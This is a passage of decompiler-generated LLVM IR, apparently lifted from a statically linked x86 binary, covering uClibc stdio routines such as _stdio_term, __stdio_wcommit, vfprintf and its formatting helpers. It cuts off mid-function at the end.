  store i32 %v0_8052561, i32* %v2_8052561, align 4
  %v2_8052566 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8052566, i32* @ebx, align 4
  store i32 %v0_805250a, i32* @esi, align 4
  store i32 %v0_8052509, i32* @edi, align 4
  ret i32 %v1_805254e

; uselistorder directives
  uselistorder i32 %v1_8052514, { 1, 0 }
  uselistorder i16* @global_var_805e290.482, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8052579 = inttoptr i32 %arg1 to i16*
  %v4_8052579 = call i32 @memcpy(i16* %v3_8052579, i32 ptrtoint (i32* @global_var_805c0e0.485 to i32), i32 24)
  ret i32 %v4_8052579
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052582 = load i32, i32* @esi, align 4
  %v0_8052583 = load i32, i32* @ebx, align 4
  store i32 %v0_8052583, i32* %stack_var_-8, align 4
  %v1_805258c = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805e20c.486 to i32))
  store i32 %v1_805258c, i32* %eax.global-to-local, align 4
  %v1_8052598 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805e224.487 to i32))
  store i32 %v1_8052598, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_805e208.488 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_80525e222 = icmp eq i32 %storemerge21, 0
  %v1_80525e424 = icmp eq i1 %v1_80525e222, false
  br i1 %v1_80525e424, label %dec_label_pc_80525a5.lr.ph, label %dec_label_pc_8052602.preheader

dec_label_pc_80525a5.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80525a5

dec_label_pc_80525a5:                             ; preds = %dec_label_pc_80525a5.lr.ph, %dec_label_pc_80525cc
  %storemerge25 = phi i32 [ %storemerge21, %dec_label_pc_80525a5.lr.ph ], [ %storemerge, %dec_label_pc_80525cc ]
  %v1_80525a8 = add i32 %storemerge25, 56
  store i32 %v1_80525a8, i32* @esi, align 4
  %v1_80525ac = call i32 @__pthread_return_0(i32 %v1_80525a8)
  store i32 %v1_80525ac, i32* %eax.global-to-local, align 4
  %v1_80525b4 = icmp eq i32 %v1_80525ac, 0
  br i1 %v1_80525b4, label %dec_label_pc_80525cc, label %dec_label_pc_80525b8

dec_label_pc_80525b8:                             ; preds = %dec_label_pc_80525a5
  %v0_80525b8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80525b8 = add i32 %v0_80525b8, 8
  %v2_80525b8 = inttoptr i32 %v1_80525b8 to i32*
  %v3_80525b8 = load i32, i32* %v2_80525b8, align 4
  store i32 %v3_80525b8, i32* %eax.global-to-local, align 4
  %v1_80525bb = inttoptr i32 %v0_80525b8 to i16*
  store i16 48, i16* %v1_80525bb, align 2
  %v0_80525c0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80525c0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80525c0 = add i32 %v1_80525c0, 24
  %v3_80525c0 = inttoptr i32 %v2_80525c0 to i32*
  store i32 %v0_80525c0, i32* %v3_80525c0, align 4
  %v0_80525c3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80525c3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80525c3 = add i32 %v1_80525c3, 28
  %v3_80525c3 = inttoptr i32 %v2_80525c3 to i32*
  store i32 %v0_80525c3, i32* %v3_80525c3, align 4
  %v0_80525c6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80525c6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80525c6 = add i32 %v1_80525c6, 16
  %v3_80525c6 = inttoptr i32 %v2_80525c6 to i32*
  store i32 %v0_80525c6, i32* %v3_80525c6, align 4
  %v0_80525c9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80525c9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80525c9 = add i32 %v1_80525c9, 20
  %v3_80525c9 = inttoptr i32 %v2_80525c9 to i32*
  store i32 %v0_80525c9, i32* %v3_80525c9, align 4
  br label %dec_label_pc_80525cc

dec_label_pc_80525cc:                             ; preds = %dec_label_pc_80525a5, %dec_label_pc_80525b8
  %v0_80525cf = load i32, i32* %ebx.global-to-local, align 4
  %v1_80525cf = add i32 %v0_80525cf, 52
  %v2_80525cf = inttoptr i32 %v1_80525cf to i32*
  store i32 1, i32* %v2_80525cf, align 4
  %v0_80525d6 = load i32, i32* @esi, align 4
  %v1_80525d7 = call i32 @__stdio_init_mutex(i32 %v0_80525d6)
  store i32 %v1_80525d7, i32* %eax.global-to-local, align 4
  %v0_80525dc = load i32, i32* %ebx.global-to-local, align 4
  %v1_80525dc = add i32 %v0_80525dc, 32
  %v2_80525dc = inttoptr i32 %v1_80525dc to i32*
  %storemerge = load i32, i32* %v2_80525dc, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_80525e2 = icmp eq i32 %storemerge, 0
  %v1_80525e4 = icmp eq i1 %v1_80525e2, false
  br i1 %v1_80525e4, label %dec_label_pc_80525a5, label %dec_label_pc_80525df.dec_label_pc_8052602.preheader_crit_edge

dec_label_pc_80525df.dec_label_pc_8052602.preheader_crit_edge: ; preds = %dec_label_pc_80525cc
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_805e208.488 to i32*), align 4
  br label %dec_label_pc_8052602.preheader

dec_label_pc_8052602.preheader:                   ; preds = %dec_label_pc_80525df.dec_label_pc_8052602.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_80525df.dec_label_pc_8052602.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_80526023 = icmp eq i32 %storemerge12, 0
  %v1_805260410 = icmp eq i1 %v1_80526023, false
  br i1 %v1_805260410, label %dec_label_pc_80525ee.preheader, label %dec_label_pc_8052606

dec_label_pc_80525ee.preheader:                   ; preds = %dec_label_pc_8052602.preheader
  br label %dec_label_pc_80525ee

dec_label_pc_80525ee:                             ; preds = %dec_label_pc_80525ee.preheader, %dec_label_pc_80525ff
  %v0_80525f6 = phi i32 [ %storemerge1, %dec_label_pc_80525ff ], [ %storemerge12, %dec_label_pc_80525ee.preheader ]
  %v1_80525ee = inttoptr i32 %v0_80525f6 to i8*
  %v2_80525ee = load i8, i8* %v1_80525ee, align 1
  %v3_80525ee = and i8 %v2_80525ee, 64
  %v4_80525ee = icmp eq i8 %v3_80525ee, 0
  br i1 %v4_80525ee, label %dec_label_pc_80525ff, label %dec_label_pc_80525f3

dec_label_pc_80525f3:                             ; preds = %dec_label_pc_80525ee
  %v1_80525f7 = call i32 @__stdio_wcommit(i32 %v0_80525f6)
  store i32 %v1_80525f7, i32* %eax.global-to-local, align 4
  %v0_80525ff.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80525ff

dec_label_pc_80525ff:                             ; preds = %dec_label_pc_80525ee, %dec_label_pc_80525f3
  %v0_80525ff = phi i32 [ %v0_80525f6, %dec_label_pc_80525ee ], [ %v0_80525ff.pre, %dec_label_pc_80525f3 ]
  %v1_80525ff = add i32 %v0_80525ff, 32
  %v2_80525ff = inttoptr i32 %v1_80525ff to i32*
  %storemerge1 = load i32, i32* %v2_80525ff, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_8052602 = icmp eq i32 %storemerge1, 0
  %v1_8052604 = icmp eq i1 %v1_8052602, false
  br i1 %v1_8052604, label %dec_label_pc_80525ee, label %dec_label_pc_8052606

dec_label_pc_8052606:                             ; preds = %dec_label_pc_80525ff, %dec_label_pc_8052602.preheader
  %v2_8052606 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052606, i32* %eax.global-to-local, align 4
  %v2_8052607 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052607, i32* @ebx, align 4
  store i32 %v0_8052582, i32* @esi, align 4
  ret i32 %v2_8052606

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_80525ff, { 1, 0 }
  uselistorder label %dec_label_pc_80525ee, { 1, 0 }
  uselistorder label %dec_label_pc_80525cc, { 1, 0 }
  uselistorder label %dec_label_pc_80525a5, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_805260c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8052614 = add i32 %arg1, 8
  %v2_8052614 = inttoptr i32 %v1_8052614 to i32*
  %v3_8052614 = load i32, i32* %v2_8052614, align 4
  store i32 %v3_8052614, i32* %edx.global-to-local, align 4
  %v1_8052617 = add i32 %arg1, 16
  %v2_8052617 = inttoptr i32 %v1_8052617 to i32*
  %v3_8052617 = load i32, i32* %v2_8052617, align 4
  %v2_805261a = sub i32 %v3_8052617, %v3_8052614
  %v12_805261a = icmp eq i32 %v2_805261a, 0
  store i32 %v2_805261a, i32* %eax.global-to-local, align 4
  br i1 %v12_805261a, label %dec_label_pc_805262d, label %dec_label_pc_805261e

dec_label_pc_805261e:                             ; preds = %entry
  store i32 %v3_8052614, i32* %v2_8052617, align 4
  %v0_8052621 = load i32, i32* @ecx, align 4
  %v0_8052622 = load i32, i32* %eax.global-to-local, align 4
  %v0_8052623 = load i32, i32* %edx.global-to-local, align 4
  %v0_8052624 = load i32, i32* @ebx, align 4
  %v4_8052625 = inttoptr i32 %v0_8052624 to i16*
  %v5_8052625 = call i32 @__stdio_WRITE(i16* %v4_8052625, i32 %v0_8052623, i32 %v0_8052622, i32 %v0_8052621)
  store i32 %v5_8052625, i32* %eax.global-to-local, align 4
  %v0_805262d.pre = load i32, i32* @ebx, align 4
  %v2_8052633.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805262d

dec_label_pc_805262d:                             ; preds = %entry, %dec_label_pc_805261e
  %v2_8052633 = phi i32 [ %tmp11, %entry ], [ %v2_8052633.pre, %dec_label_pc_805261e ]
  %v0_805262d = phi i32 [ %arg1, %entry ], [ %v0_805262d.pre, %dec_label_pc_805261e ]
  %v1_805262d = add i32 %v0_805262d, 16
  %v2_805262d = inttoptr i32 %v1_805262d to i32*
  %v3_805262d = load i32, i32* %v2_805262d, align 4
  store i32 %v3_805262d, i32* %eax.global-to-local, align 4
  %v2_8052630 = add i32 %v0_805262d, 8
  %v3_8052630 = inttoptr i32 %v2_8052630 to i32*
  %v4_8052630 = load i32, i32* %v3_8052630, align 4
  %v5_8052630 = sub i32 %v3_805262d, %v4_8052630
  store i32 %v5_8052630, i32* %eax.global-to-local, align 4
  store i32 %v2_8052633, i32* @edx, align 4
  store i32 %v0_805260c, i32* @ebx, align 4
  ret i32 %v5_8052630

; uselistorder directives
  uselistorder i32 %v0_805262d, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805262d, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v12_805263b = ptrtoint i32* %stack_var_-28 to i32
  %v4_805263e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805263e, i32* @esi, align 4
  %v1_8052642 = add i32 %v4_805263e, 52
  %v2_8052642 = inttoptr i32 %v1_8052642 to i32*
  %v3_8052642 = load i32, i32* %v2_8052642, align 4
  store i32 %v3_8052642, i32* @edi, align 4
  %v1_8052645 = icmp eq i32 %v3_8052642, 0
  %v1_8052647 = icmp eq i1 %v1_8052645, false
  br i1 %v1_8052647, label %dec_label_pc_8052668, label %dec_label_pc_8052649

dec_label_pc_8052649:                             ; preds = %entry
  %v1_8052649 = add i32 %v4_805263e, 56
  store i32 %v1_8052649, i32* @ebx, align 4
  store i32 %v12_805263b, i32* @eax, align 4
  %v3_8052658 = call i32 @__pthread_return_void(i32 %v12_805263b, i32 134567263)
  %v0_805265d = load i32, i32* @ebx, align 4
  %v2_8052660 = call i32 @__pthread_return_0(i32 %v0_805265d)
  %v0_8052668.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052668

dec_label_pc_8052668:                             ; preds = %entry, %dec_label_pc_8052649
  %v0_8052681 = phi i32 [ %v4_805263e, %entry ], [ %v0_8052668.pre, %dec_label_pc_8052649 ]
  %v1_8052668 = inttoptr i32 %v0_8052681 to i16*
  %v2_8052668 = load i16, i16* %v1_8052668, align 2
  %v1_805266b = and i16 %v2_8052668, 192
  %v6_8052670 = icmp eq i16 %v1_805266b, 192
  br i1 %v6_8052670, label %dec_label_pc_8052668.dec_label_pc_805268e_crit_edge, label %dec_label_pc_8052677

dec_label_pc_8052668.dec_label_pc_805268e_crit_edge: ; preds = %dec_label_pc_8052668
  br label %dec_label_pc_805268e

dec_label_pc_8052677:                             ; preds = %dec_label_pc_8052668
  %v0_8052677 = load i32, i32* @ecx, align 4
  store i32 -1, i32* @ebx, align 4
  %v6_8052682 = call i32 @__stdio_trans2w_o(i16* %v1_8052668, i32 128, i32 %v0_8052677, i32 %v0_8052677)
  %v1_805268a = icmp eq i32 %v6_8052682, 0
  %v1_805268c = icmp eq i1 %v1_805268a, false
  br i1 %v1_805268c, label %dec_label_pc_80526a2, label %dec_label_pc_8052677.dec_label_pc_805268e_crit_edge

dec_label_pc_8052677.dec_label_pc_805268e_crit_edge: ; preds = %dec_label_pc_8052677
  %v0_8052697.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805268e

dec_label_pc_805268e:                             ; preds = %dec_label_pc_8052668.dec_label_pc_805268e_crit_edge, %dec_label_pc_8052677.dec_label_pc_805268e_crit_edge
  %v0_8052697 = phi i32 [ %v0_8052681, %dec_label_pc_8052668.dec_label_pc_805268e_crit_edge ], [ %v0_8052697.pre, %dec_label_pc_8052677.dec_label_pc_805268e_crit_edge ]
  %v4_8052698 = inttoptr i32 %arg2 to i8*
  %v5_8052698 = call i32 @_vfprintf_internal(i32 %v0_8052697, i8* %v4_8052698, i32 %arg3)
  store i32 %v5_8052698, i32* @ebx, align 4
  br label %dec_label_pc_80526a2

dec_label_pc_80526a2:                             ; preds = %dec_label_pc_8052677, %dec_label_pc_805268e
  br i1 %v1_8052647, label %dec_label_pc_80526b7, label %dec_label_pc_80526a6

dec_label_pc_80526a6:                             ; preds = %dec_label_pc_80526a2
  store i32 %v12_805263b, i32* @eax, align 4
  %v3_80526af = call i32 @__pthread_return_void(i32 %v12_805263b, i32 1)
  br label %dec_label_pc_80526b7

dec_label_pc_80526b7:                             ; preds = %dec_label_pc_80526a2, %dec_label_pc_80526a6
  %v0_80526ba = load i32, i32* @ebx, align 4
  ret i32 %v0_80526ba

; uselistorder directives
  uselistorder i32 %v12_805263b, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i8*, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %dec_label_pc_80526b7, { 1, 0 }
  uselistorder label %dec_label_pc_80526a2, { 1, 0 }
  uselistorder label %dec_label_pc_805268e, { 1, 0 }
  uselistorder label %dec_label_pc_8052668, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_80526c0 = load i32, i32* @edi, align 4
  %v0_80526c1 = load i32, i32* @eax, align 4
  store i32 %v0_80526c1, i32* @edi, align 4
  %v0_80526c3 = load i32, i32* @esi, align 4
  %v0_80526c4 = load i32, i32* @ecx, align 4
  store i32 %v0_80526c4, i32* @esi, align 4
  %v0_80526c6 = load i32, i32* @ebx, align 4
  store i32 %v0_80526c4, i32* @ebx, align 4
  %v0_80526cc = load i32, i32* @edx, align 4
  store i32 %v0_80526cc, i32* %stack_var_-13, align 4
  %v1_80526d32 = icmp eq i32 %v0_80526c4, 0
  br i1 %v1_80526d32, label %dec_label_pc_80526eb, label %dec_label_pc_80526d7.lr.ph

dec_label_pc_80526d7.lr.ph:                       ; preds = %entry
  %v2_80526d7 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_80526d7

dec_label_pc_80526d2:                             ; preds = %dec_label_pc_80526d7
  %v1_80526d2 = add i32 %v0_80526d2, -1
  %v8_80526d2 = icmp eq i32 %v1_80526d2, 0
  store i32 %v1_80526d2, i32* @ebx, align 4
  br i1 %v8_80526d2, label %dec_label_pc_80526eb.loopexit, label %dec_label_pc_80526d2.dec_label_pc_80526d7_crit_edge

dec_label_pc_80526d2.dec_label_pc_80526d7_crit_edge: ; preds = %dec_label_pc_80526d2
  %v0_80526db.pre = load i32, i32* @edx, align 4
  %v0_80526dc.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80526d7

dec_label_pc_80526d7:                             ; preds = %dec_label_pc_80526d2.dec_label_pc_80526d7_crit_edge, %dec_label_pc_80526d7.lr.ph
  %v0_80526dc = phi i32 [ %v0_80526dc.pre, %dec_label_pc_80526d2.dec_label_pc_80526d7_crit_edge ], [ %v0_80526c1, %dec_label_pc_80526d7.lr.ph ]
  %v0_80526db = phi i32 [ %v0_80526db.pre, %dec_label_pc_80526d2.dec_label_pc_80526d7_crit_edge ], [ %v0_80526cc, %dec_label_pc_80526d7.lr.ph ]
  %v4_80526e0 = call i32 @__stdio_fwrite(i32 %v2_80526d7, i32 1, i32 %v0_80526dc, i32 %v0_80526db)
  %v8_80526e8 = icmp eq i32 %v4_80526e0, 1
  %v0_80526d2 = load i32, i32* @ebx, align 4
  br i1 %v8_80526e8, label %dec_label_pc_80526d2, label %dec_label_pc_80526eb.loopexit

dec_label_pc_80526eb.loopexit:                    ; preds = %dec_label_pc_80526d2, %dec_label_pc_80526d7
  %v1_80526ee.ph = phi i32 [ %v0_80526d2, %dec_label_pc_80526d7 ], [ 0, %dec_label_pc_80526d2 ]
  %v0_80526ee.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80526eb

dec_label_pc_80526eb:                             ; preds = %dec_label_pc_80526eb.loopexit, %entry
  %v0_80526ee = phi i32 [ 0, %entry ], [ %v0_80526ee.pre, %dec_label_pc_80526eb.loopexit ]
  %v1_80526ee = phi i32 [ 0, %entry ], [ %v1_80526ee.ph, %dec_label_pc_80526eb.loopexit ]
  %v2_80526ee = sub i32 %v0_80526ee, %v1_80526ee
  store i32 %v0_80526c6, i32* @ebx, align 4
  store i32 %v0_80526c3, i32* @esi, align 4
  store i32 %v0_80526c0, i32* @edi, align 4
  ret i32 %v2_80526ee

; uselistorder directives
  uselistorder i32 %v1_80526d2, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_80526eb.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_8052709 = trunc i32 %arg2 to i8
  %v5_8052709 = icmp slt i8 %v3_8052709, 0
  %v1_805270b = icmp eq i1 %v5_8052709, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_805270b, label %dec_label_pc_805273c, label %dec_label_pc_805270d

dec_label_pc_805270d:                             ; preds = %entry
  %v3_8052714 = call i32 @strlen(i8* %arg4)
  %v0_805271c = load i32, i32* @ebx, align 4
  %v2_805271c = sub i32 %v0_805271c, %v3_8052714
  store i32 %v2_805271c, i32* @ebx, align 4
  store i32 %v3_8052714, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_805271c, 1
  br i1 %tmp23, label %dec_label_pc_805273a, label %dec_label_pc_8052724

dec_label_pc_8052724:                             ; preds = %dec_label_pc_805270d
  store i32 %arg1, i32* @eax, align 4
  %v0_8052728 = load i32, i32* @edi, align 4
  %v1_8052728 = urem i32 %v0_8052728, 128
  store i32 %v1_8052728, i32* @edi, align 4
  store i32 %v2_805271c, i32* @ecx, align 4
  store i32 %v1_8052728, i32* @edx, align 4
  %v0_805272f = call i32 @_charpad()
  %v12_8052734 = icmp eq i32 %v0_805272f, %v2_805271c
  store i32 %v0_805272f, i32* @ebp, align 4
  %v1_8052738 = icmp eq i1 %v12_8052734, false
  br i1 %v1_8052738, label %dec_label_pc_8052756, label %dec_label_pc_8052724.dec_label_pc_805273a_crit_edge

dec_label_pc_8052724.dec_label_pc_805273a_crit_edge: ; preds = %dec_label_pc_8052724
  %v0_805273a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805273a

dec_label_pc_805273a:                             ; preds = %dec_label_pc_8052724.dec_label_pc_805273a_crit_edge, %dec_label_pc_805270d
  %v0_805273a = phi i32 [ %v0_805273a.pre, %dec_label_pc_8052724.dec_label_pc_805273a_crit_edge ], [ %v3_8052714, %dec_label_pc_805270d ]
  store i32 %v0_805273a, i32* @ebx, align 4
  br label %dec_label_pc_805273c

dec_label_pc_805273c:                             ; preds = %entry, %dec_label_pc_805273a
  %v0_8052747 = phi i32 [ %arg3, %entry ], [ %v0_805273a, %dec_label_pc_805273a ]
  %tmp24 = icmp slt i32 %v0_8052747, 1
  br i1 %tmp24, label %dec_label_pc_8052754, label %dec_label_pc_8052742

dec_label_pc_8052742:                             ; preds = %dec_label_pc_805273c
  %v0_8052742 = load i32, i32* @ecx, align 4
  %v5_805274c = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_8052747, i32 %arg1, i32 %v0_8052742)
  br label %dec_label_pc_8052754

dec_label_pc_8052754:                             ; preds = %dec_label_pc_805273c, %dec_label_pc_8052742
  %v1_8052754 = phi i32 [ 0, %dec_label_pc_805273c ], [ %v5_805274c, %dec_label_pc_8052742 ]
  %v0_8052754 = load i32, i32* @ebp, align 4
  %v2_8052754 = add i32 %v0_8052754, %v1_8052754
  br label %dec_label_pc_8052756

dec_label_pc_8052756:                             ; preds = %dec_label_pc_8052724, %dec_label_pc_8052754
  %v0_8052759 = phi i32 [ %v0_805272f, %dec_label_pc_8052724 ], [ %v2_8052754, %dec_label_pc_8052754 ]
  ret i32 %v0_8052759

; uselistorder directives
  uselistorder i32 %v0_8052747, { 1, 0 }
  uselistorder i32 %v0_805272f, { 1, 2, 0 }
  uselistorder i32 %v1_8052728, { 1, 0 }
  uselistorder i32 %v2_805271c, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052756, { 1, 0 }
  uselistorder label %dec_label_pc_8052754, { 1, 0 }
  uselistorder label %dec_label_pc_805273c, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8052763 = load i32, i32* @ebx, align 4
  store i32 %v0_8052763, i32* %stack_var_-16, align 4
  %v4_8052763 = ptrtoint i32* %stack_var_-16 to i32
  %v1_8052764 = add i32 %v4_8052763, -356
  %v10_8052764 = icmp slt i32 %v1_8052764, 0
  store i1 %v10_8052764, i1* %sf.global-to-local, align 1
  %v4_805276a = ptrtoint i8* %arg2 to i32
  store i32 %v4_805276a, i32* @ebx, align 4
  %v2_8052772 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_8052772, i32* @esi, align 4
  %v5_8052777 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_805276a)
  store i32 %v5_8052777, i32* %eax.global-to-local, align 4
  %v2_805277f = icmp slt i32 %v5_8052777, 0
  store i1 %v2_805277f, i1* %sf.global-to-local, align 1
  %v1_8052781 = icmp eq i1 %v2_805277f, false
  br i1 %v1_8052781, label %dec_label_pc_80527c1, label %dec_label_pc_8052783

dec_label_pc_8052783:                             ; preds = %entry
  %v12_805277c = ptrtoint i32* %stack_var_-364 to i32
  %v3_8052783 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_8052783, i32* @ebx, align 4
  %v1_8052787 = add i32 %v12_805277c, -12
  %v10_8052787 = icmp slt i32 %v1_8052787, 0
  store i1 %v10_8052787, i1* %sf.global-to-local, align 1
  %v5_805278a = inttoptr i32 %v3_8052783 to i8*
  %v3_805278b = call i32 @strlen(i8* %v5_805278a)
  store i32 %v3_805278b, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_805279a = icmp eq i32 %v3_805278b, 0
  %v2_805279a = icmp slt i32 %v3_805278b, 0
  store i1 %v2_805279a, i1* %sf.global-to-local, align 1
  br i1 %v1_805279a, label %dec_label_pc_8052d0a, label %dec_label_pc_80527a2

dec_label_pc_80527a2:                             ; preds = %dec_label_pc_8052783
  %v0_80527a2 = load i32, i32* @edx, align 4
  %v0_80527ab = load i32, i32* @ebx, align 4
  %v6_80527ac = call i32 @__stdio_fwrite(i32 %v0_80527ab, i32 %v3_805278b, i32 %arg1, i32 %v0_80527a2)
  store i32 %v6_80527ac, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_80527b9 = load i32, i32* @esp, align 4
  %v1_80527b9 = add i32 %v0_80527b9, 16
  %v7_80527b9 = icmp slt i32 %v1_80527b9, 0
  store i1 %v7_80527b9, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8052d0a

dec_label_pc_80527c1:                             ; preds = %entry
  %v6_80527cb = call i32 @_ppfs_prepargs(i32 %v2_8052772, i32 %arg3, i32 %v5_8052777, i32 %v5_8052777)
  store i32 %v6_80527cb, i32* %eax.global-to-local, align 4
  %v0_80527d0 = load i32, i32* @ebx, align 4
  store i32 %v0_80527d0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_80527da = load i32, i32* @esp, align 4
  %v1_80527da = add i32 %v0_80527da, 16
  %v7_80527da = icmp slt i32 %v1_80527da, 0
  store i1 %v7_80527da, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_80527e0

dec_label_pc_80527df:                             ; preds = %dec_label_pc_80527e6
  %v1_80527df = add i32 %v0_80527ee, 1
  %v9_80527df = icmp slt i32 %v1_80527df, 0
  store i1 %v9_80527df, i1* %sf.global-to-local, align 1
  store i32 %v1_80527df, i32* @ebx, align 4
  br label %dec_label_pc_80527e0.backedge

dec_label_pc_80527e0.backedge:                    ; preds = %dec_label_pc_80527df, %dec_label_pc_8052cf0, %dec_label_pc_8052cfb
  %v1_80527ea21 = phi i32 [ %v1_80527f2, %dec_label_pc_80527df ], [ %v3_8052cf0, %dec_label_pc_8052cf0 ], [ %v1_805281e, %dec_label_pc_8052cfb ]
  %v0_80527e019 = phi i32 [ %v1_80527df, %dec_label_pc_80527df ], [ %v3_8052cf0, %dec_label_pc_8052cf0 ], [ %v1_8052cfb, %dec_label_pc_8052cfb ]
  %v4_80527e0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80527e0

dec_label_pc_80527e0:                             ; preds = %dec_label_pc_80527e0.backedge, %dec_label_pc_80527c1
  %v1_80527f2 = phi i32 [ %v1_80527ea21, %dec_label_pc_80527e0.backedge ], [ %v0_80527d0, %dec_label_pc_80527c1 ]
  %v0_80527ee = phi i32 [ %v0_80527e019, %dec_label_pc_80527e0.backedge ], [ %v0_80527d0, %dec_label_pc_80527c1 ]
  %v4_80527e0 = phi i32 [ %v4_80527e0.pre, %dec_label_pc_80527e0.backedge ], [ %v6_80527cb, %dec_label_pc_80527c1 ]
  %v1_80527e0 = inttoptr i32 %v0_80527ee to i8*
  %v2_80527e0 = load i8, i8* %v1_80527e0, align 1
  %v3_80527e0 = zext i8 %v2_80527e0 to i32
  %v5_80527e0 = and i32 %v4_80527e0, -256
  %v6_80527e0 = or i32 %v3_80527e0, %v5_80527e0
  store i32 %v6_80527e0, i32* %eax.global-to-local, align 4
  %v4_80527e2 = icmp eq i8 %v2_80527e0, 0
  %v5_80527e2 = icmp slt i8 %v2_80527e0, 0
  store i1 %v5_80527e2, i1* %sf.global-to-local, align 1
  br i1 %v4_80527e2, label %dec_label_pc_80527ea, label %dec_label_pc_80527e6

dec_label_pc_80527e6:                             ; preds = %dec_label_pc_80527e0
  %v2_80527e6 = add i8 %v2_80527e0, -37
  %v10_80527e6 = icmp eq i8 %v2_80527e6, 0
  %v11_80527e6 = icmp slt i8 %v2_80527e6, 0
  store i1 %v11_80527e6, i1* %sf.global-to-local, align 1
  %v1_80527e8 = icmp eq i1 %v10_80527e6, false
  br i1 %v1_80527e8, label %dec_label_pc_80527df, label %dec_label_pc_80527ea

dec_label_pc_80527ea:                             ; preds = %dec_label_pc_80527e6, %dec_label_pc_80527e0
  %v2_80527ea = sub i32 %v0_80527ee, %v1_80527f2
  %v12_80527ea = icmp eq i32 %v2_80527ea, 0
  %v13_80527ea = icmp slt i32 %v2_80527ea, 0
  store i1 %v13_80527ea, i1* %sf.global-to-local, align 1
  br i1 %v12_80527ea, label %dec_label_pc_8052815, label %dec_label_pc_80527ee

dec_label_pc_80527ee:                             ; preds = %dec_label_pc_80527ea
